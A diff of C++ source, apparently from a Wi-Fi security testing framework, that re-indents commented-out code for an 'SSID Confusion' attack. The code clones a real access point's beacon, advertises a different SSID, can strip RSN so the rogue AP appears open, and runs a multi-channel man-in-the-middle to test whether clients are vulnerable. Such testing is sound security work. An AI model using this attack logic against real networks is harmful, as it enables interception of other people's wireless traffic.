@@ -19,88 +19,88 @@ unique_ptr<Dot11Beacon> make_confused_beacon(const Dot11Beacon &real, const stri
 	b->capabilities() = real.capabilities();
 
 	/*FIXME for (const auto& opt : real.options()) {
-            if (opt.option() == IEEE_TLV_TYPE_SSID) {
-                // Advertise a different SSID than the real AP
-                b->add_option(Dot11::option(
-                    IEEE_TLV_TYPE_SSID,
-                    confused_ssid.size(),
-                    reinterpret_cast<const uint8_t*>(confused_ssid.data())));
-            } else if (strip_rsn && opt.option() == IEEE_TLV_TYPE_RSN) {
-                // Drop RSN IE — rogue AP appears as an open network
-            } else {
-                b->add_option(opt);
-            }
-        }*/
+			if (opt.option() == IEEE_TLV_TYPE_SSID) {
+				// Advertise a different SSID than the real AP
+				b->add_option(Dot11::option(
+					IEEE_TLV_TYPE_SSID,
+					confused_ssid.size(),
+					reinterpret_cast<const uint8_t*>(confused_ssid.data())));
+			} else if (strip_rsn && opt.option() == IEEE_TLV_TYPE_RSN) {
+				// Drop RSN IE — rogue AP appears as an open network
+			} else {
+				b->add_option(opt);
+			}
+		}*/
 	return b;
 }
 
 void run_attack(RunStatus &){
 	/*const auto att_real  = rs.get_actor("rogue_client");
-        const auto att_rogue = rs.get_actor("rogue_ap");
-        const auto ap        = rs.get_actor("ap");
-        const auto client       = rs.get_actor("client");
+		const auto att_rogue = rs.get_actor("rogue_ap");
+		const auto ap        = rs.get_actor("ap");
+		const auto client       = rs.get_actor("client");
 
-        const auto& att_cfg    = rs.config().at("attack_config");
-        const string real_ssid    = ap["ssid"];
-        const string confused_ssid = att_cfg.value("confused_ssid", real_ssid);
-        const bool   strip_rsn    = att_cfg.value("strip_rsn", false);
-        const int    timeout      = att_cfg.value("attack_time_sec", 30);
+		const auto& att_cfg    = rs.config().at("attack_config");
+		const string real_ssid    = ap["ssid"];
+		const string confused_ssid = att_cfg.value("confused_ssid", real_ssid);
+		const bool   strip_rsn    = att_cfg.value("strip_rsn", false);
+		const int    timeout      = att_cfg.value("attack_time_sec", 30);
 
-        McMitm attack(att_real.get(SK::iface), att_rogue.get(SK::iface), real_ssid, client.get(SK::mac));
-        attack.setup_ifaces(att_real, client.get(SK::mac), att_rogue, ap.get(SK::mac));
-        rs.start_observers();
+		McMitm attack(att_real.get(SK::iface), att_rogue.get(SK::iface), real_ssid, client.get(SK::mac));
+		attack.setup_ifaces(att_real, client.get(SK::mac), att_rogue, ap.get(SK::mac));
+		rs.start_observers();
 
-        attack.sender_real  = make_unique<PacketSender>(att_real["sniff_iface"]);
-        attack.sender_rogue = make_unique<PacketSender>(att_rogue["sniff_iface"]);
+		attack.sender_real  = make_unique<PacketSender>(att_real["sniff_iface"]);
+		attack.sender_rogue = make_unique<PacketSender>(att_rogue["sniff_iface"]);
 
-        // Sniff only frames involving the real AP or the targeted client
-        string bpf = "(wlan addr1 "+ap.get(SK::mac)+") or (wlan addr2 "+ap.get(SK::mac)+")"
-            " or (wlan addr1 "+client.get(SK::mac)+") or (wlan addr2 "+client.get(SK::mac)+")";
-        bpf = "(wlan type data or wlan type mgt) and ("+bpf+")";
+		// Sniff only frames involving the real AP or the targeted client
+		string bpf = "(wlan addr1 "+ap.get(SK::mac)+") or (wlan addr2 "+ap.get(SK::mac)+")"
+			" or (wlan addr1 "+client.get(SK::mac)+") or (wlan addr2 "+client.get(SK::mac)+")";
+		bpf = "(wlan type data or wlan type mgt) and ("+bpf+")";
 
-        SnifferConfiguration cfg_real, cfg_rogue;
-        cfg_real.set_filter(bpf);
-        cfg_rogue.set_filter(bpf);
-        cfg_real.set_immediate_mode(true);
-        cfg_rogue.set_immediate_mode(true);
+		SnifferConfiguration cfg_real, cfg_rogue;
+		cfg_real.set_filter(bpf);
+		cfg_rogue.set_filter(bpf);
+		cfg_real.set_immediate_mode(true);
+		cfg_rogue.set_immediate_mode(true);
 
-        attack.sniffer_real  = make_unique<Sniffer>(att_real["sniff_iface"],  cfg_real);
-        attack.sniffer_rogue = make_unique<Sniffer>(att_rogue["sniff_iface"], cfg_rogue);
+		attack.sniffer_real  = make_unique<Sniffer>(att_real["sniff_iface"],  cfg_real);
+		attack.sniffer_rogue = make_unique<Sniffer>(att_rogue["sniff_iface"], cfg_rogue);
 
-        // Scan for real AP beacon to clone its IEs (RSN, HT caps, …)
-        attack_scan::ScanAP scan_ap{};
-        scan_ap.bssid = ap.get(SK::mac);
-        attack.beacon = RSN_scan(att_real.get(SK::iface), 10, scan_ap);
-        if (!attack.beacon)
-            throw run_err("SSID Confusion: beacon of real AP not found");
+		// Scan for real AP beacon to clone its IEs (RSN, HT caps, …)
+		attack_scan::ScanAP scan_ap{};
+		scan_ap.bssid = ap.get(SK::mac);
+		attack.beacon = RSN_scan(att_real.get(SK::iface), 10, scan_ap);
+		if (!attack.beacon)
+			throw run_err("SSID Confusion: beacon of real AP not found");
 
-        // Build the rogue beacon with the confused SSID (and optionally no RSN)
-        const auto confused_beacon = make_confused_beacon(*attack.beacon, confused_ssid, strip_rsn);
+		// Build the rogue beacon with the confused SSID (and optionally no RSN)
+		const auto confused_beacon = make_confused_beacon(*attack.beacon, confused_ssid, strip_rsn);
 
-        log(LogLevel::INFO, "SSID Confusion setup: real='"+real_ssid+"' rogue='"+confused_ssid+"'");
+		log(LogLevel::INFO, "SSID Confusion setup: real='"+real_ssid+"' rogue='"+confused_ssid+"'");
 
-        log(LogLevel::INFO, "Rogue AP started, waiting 1 s to initialize ...");
-        this_thread::sleep_for(seconds(1));
+		log(LogLevel::INFO, "Rogue AP started, waiting 1 s to initialize ...");
+		this_thread::sleep_for(seconds(1));
 
-        attack.netconfig.real_channel  = Channel{stoi(ap["channel"])};
-        attack.netconfig.rogue_channel = Channel{stoi(att_rogue["channel"])};
-        attack.netconfig.ssid = real_ssid;
-        attack.ap_mac         = ap.get(SK::mac);
-        attack.client_mac     = client.get(SK::mac);
+		attack.netconfig.real_channel  = Channel{stoi(ap["channel"])};
+		attack.netconfig.rogue_channel = Channel{stoi(att_rogue["channel"])};
+		attack.netconfig.ssid = real_ssid;
+		attack.ap_mac         = ap.get(SK::mac);
+		attack.client_mac     = client.get(SK::mac);
 
-        // McMitm::run() sends CSA beacons continuously throughout its loop
-        attack.run(timeout);
+		// McMitm::run() sends CSA beacons continuously throughout its loop
+		attack.run(timeout);
 
-        bool vulnerable = false;
-        for (const auto& [mac, client_entry] : attack.clients) {
-            if (client_entry->state >= ClientState::GotMitm) {
-                vulnerable = true;
-                log(LogLevel::INFO,
-                    "RESULT VULNERABLE: client "+mac+" accepted rogue SSID '"+confused_ssid+
-                    "' while configured for '"+real_ssid+"'");
-            }
-        }
-        if (!vulnerable)
-            log(LogLevel::INFO, "RESULT NOT_VULNERABLE: no client connected to rogue SSID '"+confused_ssid+"'");*/
+		bool vulnerable = false;
+		for (const auto& [mac, client_entry] : attack.clients) {
+			if (client_entry->state >= ClientState::GotMitm) {
+				vulnerable = true;
+				log(LogLevel::INFO,
+					"RESULT VULNERABLE: client "+mac+" accepted rogue SSID '"+confused_ssid+
+					"' while configured for '"+real_ssid+"'");
+			}
+		}
+		if (!vulnerable)
+			log(LogLevel::INFO, "RESULT NOT_VULNERABLE: no client connected to rogue SSID '"+confused_ssid+"'");*/
 }
 }
